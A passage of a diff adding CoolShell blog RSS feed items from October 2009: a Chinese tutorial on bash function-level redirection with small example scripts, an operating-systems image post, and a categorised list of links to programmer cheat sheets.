+		<pubDate>Thu, 15 Oct 2009 02:44:53 +0000</pubDate>
+				<category><![CDATA[操作系统]]></category>
+		<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[MacOS]]></category>
+		<category><![CDATA[Windows]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1579</guid>
+
+					<description><![CDATA[<p>一图胜千言 （转载本站文章请注明作者和出处 酷 壳 &#8211; CoolShell ，请勿用于任何商业用途） 相关文章粉丝眼中的操作系统性能调优攻略10大经...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1579.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1579.html">一张关于操作系统的图</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>一图胜千言<img decoding="async" loading="lazy" class="aligncenter size-full wp-image-1580" title="operating-systems" src="https://coolshell.cn/wp-content/uploads/2009/10/operating-systems.jpg" alt="operating-systems" width="504" height="445" srcset="https://coolshell.cn/wp-content/uploads/2009/10/operating-systems.jpg 504w, https://coolshell.cn/wp-content/uploads/2009/10/operating-systems-300x265.jpg 300w, https://coolshell.cn/wp-content/uploads/2009/10/operating-systems-306x270.jpg 306w" sizes="(max-width: 504px) 100vw, 504px" /><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/1998.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/12/operatingsystems-fanboys-150x150.jpg" alt="粉丝眼中的操作系统" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1998.html" class="wp_rp_title">粉丝眼中的操作系统</a></li><li ><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/06/f1-150x150.jpg" alt="性能调优攻略" width="150" height="150" /></a><a href="https://coolshell.cn/articles/7490.html" class="wp_rp_title">性能调优攻略</a></li><li ><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="10大经典错误" width="150" height="150" /></a><a href="https://coolshell.cn/articles/5107.html" class="wp_rp_title">10大经典错误</a></li><li ><a href="https://coolshell.cn/articles/4102.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/25.jpg" alt="如何学好C语言" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4102.html" class="wp_rp_title">如何学好C语言</a></li><li ><a href="https://coolshell.cn/articles/4077.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/7.jpg" alt="纯文本配置还是注册表" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4077.html" class="wp_rp_title">纯文本配置还是注册表</a></li><li ><a href="https://coolshell.cn/articles/1272.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/08/linux_airline-150x150.jpg" alt="操作系统航空公司" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1272.html" class="wp_rp_title">操作系统航空公司</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1579.html">一张关于操作系统的图</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1579.html/feed</wfw:commentRss>
+			<slash:comments>14</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>bash 函数级重定向</title>
+		<link>https://coolshell.cn/articles/1574.html</link>
+					<comments>https://coolshell.cn/articles/1574.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Wed, 14 Oct 2009 15:47:25 +0000</pubDate>
+				<category><![CDATA[Unix/Linux]]></category>
+		<category><![CDATA[Bash]]></category>
+		<category><![CDATA[Redirections]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1574</guid>
+
+					<description><![CDATA[<p>相信每一个人对于操作系统的重定向不会陌生了。就是&#62;, &#62;&#62;, &#60;, &#60;&#60;，关于重定向的基本知识我就不说了。这里主要讨论bas...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1574.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1574.html">bash 函数级重定向</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="size-full wp-image-1380 alignright" title="bash 函数级重定向" src="https://coolshell.cn/wp-content/uploads/2009/08/bash.jpg" alt="bash 函数级重定向" width="120" height="120" />相信每一个人对于操作系统的重定向不会陌生了。就是&gt;, &gt;&gt;, &lt;, &lt;&lt;，关于重定向的基本知识我就不说了。这里主要讨论bash的重定向中的一个鲜为人知的东西，那就是bash脚本的函数也可以定义相关的重定向操作。这可不是命令级的重定向，这是函数级的重点向。这并不是一个新的东西，我只是想告诉大家一个已经存在了多年但却可能不被人常用的功能。</p>
+<p>关于bash的这个函数级的重定向的语法其实很简单，你只需要在函数结尾时加上一些重定向的定义或指示符就可以了。下面是一个示例：</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">function mytest()
+{
+        ...
+} &lt; mytest.in &gt; mytest.out 2&gt; mytest.err</pre>
+<p>现在，只要是test被调用，那么，这个函数就会从mytest.in读入数据，并把输出重定向到mytest.out文件中，然后标准错误则输出到mytest.err文件中。是不是很简单？</p>
+<p><span id="more-1574"></span></p>
+<p>因为函数级的重定向仅当在被函数调用的时候才会起作用，而且其也是脚本的一部分，所以，你自然也可以使用变量来借文件名。下面是一个示例：</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">#!/bin/bash
+
+function mytest()
+{
+    echo Hello World CoolShell.cn
+} &gt;$out
+
+out=mytest1.out
+mytest
+out=mytest2.out
+mytest</pre>
+<p>这样一来，标准输出的重定向就可以随$out变量的改变而改变了。在上面的例子中，第一个调是重定向到mytest1.out，第二个则是到mytest2.out。</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">$ bash mytest.sh; more mytest?.out
+::::::::::::::
+mytest1.out
+::::::::::::::
+Hello World CoolShell.cn
+::::::::::::::
+mytest2.out
+::::::::::::::
+Hello World CoolShell.cn</pre>
+<p>正如前面所说的一样，这里并没有什么新的东西。上面的这个示例，转成传统的写法是：</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">#!/bin/bash
+
+function mytest()
+{
+    echo Hello World CoolShell.cn
+}
+mytest &gt;mytest1.out
+mytest &gt;mytest2.out</pre>
+<p>到此为此，好像这个feature并没有什么特别的实用之处。有一个可能比较实用的用法可能是把把你所有代码的的标准错误重定向到一个文件中去。如下面所示：</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">#!/bin/bash
+
+log=err.log
+function error()
+{
+    echo &quot;$*&quot; &gt;&amp;2
+}
+function mytest1()
+{
+    error mytest1 hello1 world1 coolshell.cn
+}
+
+function mytest2()
+{
+    error mytest2 hello2 world2 coolshell.cn
+}
+
+function main()
+{
+    mytest1
+    mytest2
+} 2&gt;$log
+
+main</pre>
+<p>运行上面的脚本，你可以得到下面的结果：</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">$ bash mytest.sh ;cat err.log
+mytest1 hello1 world1 coolshell.cn
+mytest2 hello2 world2 coolshell.cn</pre>
+<p>当然，你也可以不用定义一个函数，只要是{&#8230;} 语句块，就可以使用函数级的重定向，就如下面的示例一样：</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">#!/bin/bash
+
+log=err.log
+function error()
+{
+    echo &quot;$*&quot; &gt;&amp;2
+}
+function mytest1()
+{
+    error mytest1 hello1 world1 coolshell.cn
+}
+
+function mytest2()
+{
+    error mytest2 hello2 world2 coolshell.cn
+}
+
+{
+mytest1
+mytest2
+} 2&gt;$log</pre>
+<p>你也可以重定向 (&#8230;) 语句块，但那会导致语句被执行于一个sub-shell中，这可能会导致一些你不期望的行为或问题，因为sub-shell是在另一个进程中。</p>
+<p>如果你问，我们是否可以覆盖函数级的重定向。答案是否定的。如果你试图这样做，那么，函数调用点的重定向会首先执行，然后函数定义上的重定向会将其覆盖。下面是一个示例：</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">#!/bin/bash
+
+function mytest()
+{
+    echo hello world coolshell.cn
+} &gt;out1.txt
+mytest &gt;out2.txt</pre>
+<p>运行结果是，out2.txt会被建立，但里面什么也没有。</p>
+<p>下面是一个重定向标准输入的例子：</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">#!/bin/bash
+
+function mytest()
+{
+    while read line
+    do
+        echo $line
+    done
+} &lt;&lt;EOF
+hello
+coolshell.cn
+EOF
+mytest</pre>
+<p>下面是其运行结果：</p>
+<pre data-enlighter-language="bash" class="EnlighterJSRAW">$ bash mytest.sh
+hello
+coolshell.cn</pre>
+<p>(全文完)<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/11973.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/09/bashbug-150x150.jpg" alt="bash代码注入的安全漏洞" width="150" height="150" /></a><a href="https://coolshell.cn/articles/11973.html" class="wp_rp_title">bash代码注入的安全漏洞</a></li><li ><a href="https://coolshell.cn/articles/8883.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/01/linux-bash-300x225-150x150.jpg" alt="应该知道的Linux技巧" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8883.html" class="wp_rp_title">应该知道的Linux技巧</a></li><li ><a href="https://coolshell.cn/articles/8619.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/11/shell.01-150x150.png" alt="你可能不知道的Shell" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8619.html" class="wp_rp_title">你可能不知道的Shell</a></li><li ><a href="https://coolshell.cn/articles/2987.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg" alt="用脚本实现哄宝宝睡觉(Demo)" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2987.html" class="wp_rp_title">用脚本实现哄宝宝睡觉(Demo)</a></li><li ><a href="https://coolshell.cn/articles/1824.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/14.jpg" alt="C语言和sh脚本的杂交代码" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1824.html" class="wp_rp_title">C语言和sh脚本的杂交代码</a></li><li ><a href="https://coolshell.cn/articles/1539.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/10/baby_linux-150x150.jpg" alt="用脚本实现哄小孩睡觉" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1539.html" class="wp_rp_title">用脚本实现哄小孩睡觉</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1574.html">bash 函数级重定向</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1574.html/feed</wfw:commentRss>
+			<slash:comments>7</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>程序员小抄大全</title>
+		<link>https://coolshell.cn/articles/1566.html</link>
+					<comments>https://coolshell.cn/articles/1566.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Tue, 13 Oct 2009 14:26:30 +0000</pubDate>
+				<category><![CDATA[技术读物]]></category>
+		<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[编程工具]]></category>
+		<category><![CDATA[Cheat Sheet]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1566</guid>
+
+					<description><![CDATA[<p>你是否会经常忘记一些CSS中的函数名或是一些属性名，那个时候，你一定觉得，如果手边有一个“小抄”（Cheat Sheet）就好了。当然，这个“小抄”不是给你作弊...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1566.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1566.html">程序员小抄大全</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script><img decoding="async" loading="lazy" class="size-full wp-image-1568 alignright" title="Cheat Sheet" src="https://coolshell.cn/wp-content/uploads/2009/10/Cheating.jpg" alt="Cheat Sheet" width="180" height="120" />你是否会经常忘记一些CSS中的函数名或是一些属性名，那个时候，你一定觉得，如果手边有一个“小抄”（Cheat Sheet）就好了。当然，这个“小抄”不是给你作弊用的，这个“小纸条”就是可以让你马上知道那个你最想知道的东西。这个“小抄”上也不需要有所有的东西，就需要那些经常用的就行了。现在，网上有很多这样的“小抄”，它们可能是PDF格式的，可能是PNG格式的，你可以很方便地把其打印出来（可以打印得很小），然后贴在你的电脑旁，一但需要，瞟一眼就可以了，这对于我们的工作是相当方便的。</p>
+<p>之前，酷壳也有两篇关于速查卡的文章《<a rel="bookmark" href="https://coolshell.cn/articles/870.html">Web设计的速查卡</a>》和《<a rel="bookmark" href="https://coolshell.cn/articles/150.html">Vim命令速查卡</a>》，不过都不如本贴多。</p>
+<p>下面是N多的各种和样的“小抄”，其中包括了Ajax, C++, Java, Python, PHP, Perl, ASP, Unix, Ruby, Google, HTML, CSS, XML &#8230;&#8230;..，让我们姑且叫做“程序员小抄大全”吧。当然，他们都是英文版的，可能某些链接你可能需要翻墙软件才能访问。我这里就不教你怎么翻墙了，这样的贴子网上多的是。</p>
+<p><span id="more-1566"></span></p>
+<p><strong>Actionscript</strong></p>
+<ul>
+<li><a href="http://actionscriptcheatsheet.com/blog/quick-referencecheatsheet-for-actionscript-20/">Quick reference/Cheatsheet for ActionScript 2.0</a></li>
+</ul>
+<p><strong>Ajax</strong></p>
+<ul>
+<li><a href="http://slash7.com/cheats/whats_ajax_cheatsheet.pdf">What&#8217;s Ajax? Cheat Sheet — PDF</a></li>
+<li><a href="http://www.snook.ca/archives/javascript/prototype_disse/">Prototype Dissected — Cheat Sheet PNG</a></li>
+<li><a href="http://slash7.com/cheats/scriptaculous_fx1.pdf">scriptaculous Combination Effects — Cheat Sheet — PDF</a></li>
+</ul>
+<p><strong>Apache</strong></p>
+<ul>
+<li><a href="http://www.petefreitag.com/cheatsheets/apache/">Apache Cheat Sheet</a></li>
+<li><a href="http://www.thejackol.com/htaccess-cheatsheet/">htaccess Cheatsheet</a></li>
+<li><a href="http://www.addedbytes.com/mod_rewrite_cheat_sheet.png">mod_rewrite Cheat Sheet — PNG</a></li>
+<li><a href="http://www.addedbytes.com/mod_rewrite_cheat_sheet.pdf">mod_rewrite Cheat Sheet — PDF</a></li>
+</ul>
+<p><strong>ASCII Character Codes</strong></p>
+<ul>
+<li><a href="http://www.cookwood.com/html/extras/entities.html">Character Entity References in HTML 4 and XHTML 1.0</a></li>
+<li><a href="http://www.addedbytes.com/characters_cheat_sheet.png">HTML Character Entities Cheat Sheet — PNG</a></li>
+<li><a href="http://www.addedbytes.com/characters_cheat_sheet.pdf">HTML Character Entities Cheat Sheet — PDF</a></li>
+<li><a href="http://www.chami.com/tips/internet/050798I.html">HTML special character reference</a></li>
+<li><a href="http://tlt.its.psu.edu/suggestions/international/web/codehtml.html">HTML — Special Entity Codes</a></li>
+<li><a href="http://www.yellowpipe.com/yis/tools/ASCII-HTML-Characters/index.php">Special ASCII HTML Character Codes</a></li>
+<li><a href="http://www.digitalmediaminute.com/reference/entity/index.php">XHTML Character Entity Reference</a></li>
+</ul>
+<p><strong>ASP</strong></p>
+<ul>
+<li><a href="http://www.addedbytes.com/asp_cheat_sheet.png">ASP / VBScript Cheat Sheet — PNG</a></li>
+</ul>
+<p><strong>C# and VB.NET</strong></p>
+<ul>
+<li><a href="http://aspalliance.com/625">C# and VB.NET Comparison Cheat Sheet — PDF</a></li>
+<li><a href="http://www.codeproject.com/dotnet/CheatSheetCastingNET.asp">Cheat Sheet — Casting in VB.NET and C#</a></li>
+</ul>
+<p><strong>CSS</strong></p>
+<ul>
+<li><a href="http://www.veign.com/downloads/guides/qrg0007.pdf">CSS 2 — Quick Reference Guide — PDF</a></li>
+<li><a href="http://www.addedbytes.com/css_cheat_sheet.pdf">CSS Cheat Sheet — PDF</a></li>
+<li><a href="http://www.addedbytes.com/css_cheat_sheet.png">CSS Cheat Sheet — PNG</a></li>
+<li><a href="http://www.blooberry.com/indexdot/css/propindex/all.htm">CSS Property Index</a></li>
+<li><a href="http://home.tampabay.rr.com/bmerkey/cheatsheet.htm">Cascading Style Cheatsheet</a></li>
+<li><a href="http://www.dustindiaz.com/css-shorthand/">CSS Shorthand Guide</a></li>
+</ul>
+<p><strong>CVS</strong></p>
+<ul>
+<li><a href="http://www-bcl.cs.unm.edu/computers/cvs.html">CVS Cheat Sheet</a></li>
+<li><a href="http://www.cs.put.poznan.pl/csobaniec/Papers/svn-refcard.pdf">Subversion Quick Reference Card — PDF</a></li>
+<li><a href="http://www.slac.stanford.edu/grp/cd/soft/cvs/cvs_cheatsheet.html">CVS Cheat-sheet</a></li>
+</ul>
+<p><strong>C++</strong></p>
+<ul>
+<li><a href="http://www.linuxsoftware.co.nz/cppcontainers.html">C++ Containers Cheat Sheet</a></li>
+<li><a href="http://downloads.dreamincode.net/ref_sheets/cpp_reference_sheet.pdf">C++ Quick Reference Sheet (Cheat Sheet) — PDF</a></li>
+<li><a href="http://cs.fit.edu/%7Emmahoney/cse2050/how2cpp.html">How to Program in C++ — Language Summary</a></li>
+</ul>
+<p><strong>Django</strong></p>
+<ul>
+<li><a title="The Django Book" href="http://www.djangobook.com/">The Django Book</a></li>
+</ul>
+<p><strong>Firefox</strong></p>
+<ul>
+<li><a href="http://the-cream.blogspot.com/2006/10/firefox-keyboard-shortcuts.html">Firefox Keyboard Shortcuts — PDF</a></li>
+<li><a href="http://www.accessfirefox.com/ShortcutsKandM.html">Firefox Shortcuts Sheet</a></li>
+<li><a href="http://lesliefranke.com/2006/06/22/mozilla-firefox-cheat-sheet-update/">Mozilla Firefox Cheat Sheet</a></li>
+<li><a href="http://lesliefranke.com/files/reference/thunderbirdcheatsheet.html">Mozilla Thunderbird Cheat Sheet</a></li>
+<li><a href="http://www.mozilla.org/support/firefox/keyboard">Keyboard Shortcuts</a></li>
+</ul>
+<p><strong>Google</strong></p>
+<ul>
+<li><a href="http://evhead.com/hodgepodge/gmail-shortcuts.html">Gmail Shortcuts (printable cheatsheet)</a></li>
+<li><a href="http://www.googleguide.com/advanced_operators_reference.html">Google Advanced Operators (Cheat Sheet)</a></li>
+<li><a href="http://www.adelaider.com/google/">Google Cheat Sheet (Version 1.06) — PDF</a></li>
+<li><a href="http://www.bueltge.de/allg-google-cheat-sheet/42/">Google Cheat Sheet — auch als PDF</a></li>
+<li><a href="http://www.feedsforme.com/google/">Google Cheat Sheets — auch als PDF</a></li>
+<li><a href="http://www.google.com/help/cheatsheet.html">Google Help : Cheat Sheet</a></li>
+</ul>
+<p><strong>HTML/XHTML</strong></p>
+<ul>
+<li><a href="http://www.alphalink.com.au/%7Erhduncan/htmlguide/cheatindex.html">A Simple Guide To HTML — Cheat Sheet</a></li>
+<li><a href="http://library.albany.edu/imc/pdf/HTML-XHTML_Tag_Sheet.pdf">HTML &amp; XHTML Tag Quick Reference</a></li>
+<li><a href="http://www.psacake.com/web/dy.asp">HTML Cheat Sheet</a></li>
+<li><a href="http://www.cookwood.com/html/extras/entities.html">HTML Entities</a></li>
+<li><a href="http://www.killersites.com/HTML_CODES/index.jsp">HTML CODES CHEAT SHEET</a></li>
+<li><a href="http://cdburnerxp.se/htmlcheatsheet.pdf">XHTML</a></li>
+<li><a href="http://www.angelfire.com/nm/thehtmlsource/html/cheatsheet.html">HTML Cheat Sheet</a></li>
+<li><a href="http://cdburnerxp.se/htmlcheatsheet.pdf">XHTML Cheat Sheet v. 1.03 — PDF</a></li>
+</ul>
+<p><strong>Java</strong></p>
+<ul>
+<li><a href="http://www.janeg.ca/JQREF.pdf">Java Quick Reference — PDF</a></li>
+<li><a href="http://java.sun.com/products/jsp/syntax/1.1/card11.pdf">(</a><a href="http://java.sun.com/products/jsp/syntax/1.1/card11.pdf">JSPª) SYNTAX version 1.1</a></li>
+<li><a href="http://java.sun.com/products/jsp/syntax/2.0/card20.pdf">(JSP<img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2122.png" alt="™" class="wp-smiley" style="height: 1em; max-height: 1em;" />) SYNTAX version 2.0</a></li>
+</ul>
+<p><strong>JavaScript</strong></p>
+<ul>
+<li><a href="http://www.addedbytes.com/javascript_cheat_sheet.png">JavaScript Cheat Sheet — PNG</a></li>
+<li><a href="http://www.addedbytes.com/javascript_cheat_sheet.pdf">JavaScript Cheat Sheet — PDF</a></li>
+<li><a href="http://javascript-reference.info/">JavaScript Reference</a></li>
+<li><a href="http://www.dannyg.com/ref/jsquickref.html">JavaScript and Browser Objects Quick Reference</a></li>
+<li><a href="http://www.visibone.com/regular-expressions/">Regular Expressions for JavaSript — free online quick reference</a></li>
+</ul>
+<p><strong>Microformats</strong></p>
+<ul>
+<li><a href="http://www.addedbytes.com/cheat-sheets/microformats-cheat-sheet/">Microformats Cheat Sheet</a></li>
+<li><a href="http://suda.co.uk/projects/microformats/cheatsheet/">Microformats Cheat Sheet</a></li>
+</ul>
+<p><strong>Misc</strong></p>
+<ul>
+<li><a href="http://www.draac.com/chmodchart.html">CHMOD Chart</a></li>
+<li><a href="http://photonotes.org/cgi-bin/view.pl?letter=%21">Complete listing of common camera symbols.</a></li>
+<li><a href="http://www.sql-und-xml.de/unicode-database/">The Unicode-Database</a></li>
+<li><a href="http://www.addedbytes.com/colourchart.png">RGB Hex Colour Chart — PNG</a></li>
+<li><a href="http://www.geocities.com/Athens/1802/pgpcard.html">Pretty Good PGP Reference Card</a></li>
+<li><a href="http://www.aiic.net/ViewPage.cfm/page302.htm">Search Engine Cheat Sheet</a></li>
+<li><a href="http://www.digilife.be/quickreferences/quickrefs.htm">Quick Reference Cards</a></li>
+</ul>
+<p><strong>MySQL</strong></p>
+<ul>
+<li><a href="http://www.nparikh.org/unix/mysql.php">MySQL Cheat Sheet</a></li>
+<li><a href="http://www.addedbytes.com/mysql_cheat_sheet.pdf">MySQL Cheat Sheet — PDF</a></li>
+<li><a href="http://www.addedbytes.com/mysql_cheat_sheet.png">MySQL Cheat Sheet — PNG</a></li>
+<li><a href="http://www.3gwt.net/demo/SQL_redux.html">SQL Cheatsheet</a></li>
+</ul>
+<p><strong>Oracle</strong></p>
+<ul>
+<li><a href="http://www.yagc.ndo.co.uk/cheatsheets/plsql_cheatsheet.html">Oracle PL/SQL Cheatsheet</a></li>
+<li><a href="http://www.vttoth.com/oracle.htm">Oracle Cheat Sheet</a></li>
+<li><a href="http://radio.weblogs.com/0128037/stories/2003/10/21/oracleScmInstallationCheatSheet.html">Oracle SCM Installation Cheat Sheet</a></li>
+</ul>
+<p><strong>Perl</strong></p>
+<ul>
+<li><a href="http://www.mnlab.cs.depaul.edu/%7Eehab/Courses/TDC568/resources/PerlQuickRef.pdf">Perl Regular Expression -Quick Reference — PDF</a></li>
+<li><a href="http://juerd.nl/site.plp/perlcheat">Perl Cheat Sheet</a></li>
+<li><a href="http://juerd.nl/site.plp/perlcheat">Perl Cheat Sheet</a></li>
+<li><a href="http://search.cpan.org/%7Enwclark/perl-5.8.7/pod/perlcheat.pod">Perl 5 Cheat Sheet</a></li>
+<li><a href="http://johnbokma.com/perl/perl-quick-reference-card.html">Perl Quick Reference Card — PDF</a></li>
+<li><a href="http://refcards.com/refcards/perl-regexp/index.html">Perl Regexp Quick Reference Card — PDF</a></li>
+</ul>
+<p><strong>Photoshop/Gimp</strong></p>
+<ul>
+<li><a href="http://frenchfragfactory.net/ozh/download/refcards/Gimp.pdf">Gimp Quick Reference Card v.1.0</a></li>
+<li><a href="http://frenchfragfactory.net/ozh/download/refcards/Photoshop.pdf">Photoshop 7.0 Quick Reference Card for Windows — PDF</a></li>
+<li><a href="http://www.creativetechs.com/tips/tip_resources/PSCS2_Shortcuts_Windows.pdf">Photoshop CS2 Keyboard Shortcuts (Windows) — PDF</a></li>
+<li><a href="http://www.creativetechs.com/tips/tip_resources/PSCS2_Shortcuts_Mac.pdf">Photoshop CS2 Keyboard Shortcuts (Macintosh) — PDF</a></li>
+</ul>
+<p><strong>PHP</strong></p>
+<ul>
+<li><a href="http://www.symfony-project.com/weblog/2006/04/25/admin-generator-cheat-sheet.html">symfony PHP5 framework — Admin Generator cheat sheet — PDF</a></li>
+<li><a href="http://www.addedbytes.com/php_cheat_sheet.pdf">PHP Cheat Sheet — PDF</a></li>
+<li><a href="http://www.addedbytes.com/php_cheat_sheet.png">PHP Cheat Sheet — PNG</a></li>
+<li><a href="http://www.blueshoes.org/en/developer/php_cheat_sheet/">PHP Cheat Sheet with special php syntax</a></li>
+<li><a href="http://www.addedbytes.com/regular_expressions_cheat_sheet.png">Regular Expressions Cheat Sheet — PNG</a></li>
+</ul>
+<p><strong>Python</strong></p>
+<ul>
+<li><a href="http://www-128.ibm.com/developerworks/library/l-cheatsheet3.html">Python 101 cheat sheet</a></li>
+<li><a href="http://www.yukoncollege.yk.ca/%7Ettopper/COMP118/rCheatSheet.html">Python Cheat Sheet</a></li>
+<li><a href="http://www.drweb.de/weblog/weblog/?p=548">Python Cheat Sheet — PDF</a></li>
+<li><a href="http://www.onlamp.com/python/excerpt/PythonPocketRef/examples/python.pdf">Python Quick Reference</a></li>
+<li><a href="http://rgruet.free.fr/PQR24/PQR2.4.html">Python 2.4 Quick Reference</a></li>
+</ul>
+<p><strong>Regular Expressions</strong></p>
+<ul>
+<li><a href="http://www.addedbytes.com/cheat-sheets/regular-expressions-cheat-sheet/">Regular Expressions Cheat Sheet</a></li>
+<li><a href="http://regexlib.com/CheatSheet.aspx">Regular Expression Cheat Sheet (.NET)</a></li>
+</ul>
+<p><strong>Ruby</strong></p>
+<ul>
+<li><a href="http://slash7.com/cheats/activerecord_cheatsheet.pdf">ActiveRecord Relationships — Ruby on Rails cheat sheet guide — PDF</a></li>
+<li><a href="http://www.blainekendall.com/index.php/rubyonrailscheatsheet/">RubyOnRails-Cheatsheet — PDF</a></li>
+<li><a href="http://www.addedbytes.com/ruby_on_rails_cheat_sheet.png">Ruby on Rails Cheat Sheet — PNG</a></li>
+<li><a href="http://slash7.com/cheats/form_helpers.pdf">Ruby on Rails cheat sheet guide — PDF</a></li>
+<li><a href="http://www.zenspider.com/Languages/Ruby/QuickRef.html">Ruby quick reference</a></li>
+<li><a href="http://www.threaded.com/ruby_cheatsheet.htm">Threadeds Ruby Cheat Sheet</a></li>
+<li><a href="http://slash7.com/cheats/rails_files_cheatsheet.pdf">What Goes Where? — Ruby on Rails cheat sheet — PDF</a></li>
+</ul>
+<p><strong>Unix/Linux</strong></p>
+<ul>
+<li><a href="http://www.unixguide.net/linux/linuxshortcuts.shtml">Linux Shortcuts and Commands</a></li>
+<li><a href="http://aperiodic.net/screen/quick_reference?do=show">quick_reference [GNU screen]</a></li>
+<li><a href="http://www.pixelbeat.org/cmdline.html">Unix Cheat Sheet</a></li>
+<li><a href="http://homepage.powerup.com.au/%7Esquadron/linux_manual.pdf">The One Page Linux Manual — Version 3 — PDF </a></li>
+<li><a href="http://www.gasmi.net/docs/tcp.html">TCP Ports list (3498 ports in list) </a></li>
+<li><a href="http://www.rain.org/%7emkummel/unix.html">Treebeard&#8217;s Unix Cheat Sheet</a></li>
